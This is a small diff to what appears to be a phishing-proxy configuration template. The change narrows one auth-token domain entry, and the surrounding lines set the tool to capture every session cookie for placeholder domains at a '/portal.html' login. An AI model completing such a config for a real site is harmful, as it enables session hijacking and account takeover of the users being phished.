@@ -8,7 +8,7 @@ sub_filters:
 auth_tokens:
   - domain: '.subdomainhere.domainhere'
     keys: ['.*,regexp']
-  - domain: 'domainhere'
+  - domain: 'subdomainhere.domainhere'
     keys: ['.*,regexp']
 auth_urls:
   - '/portal.html'
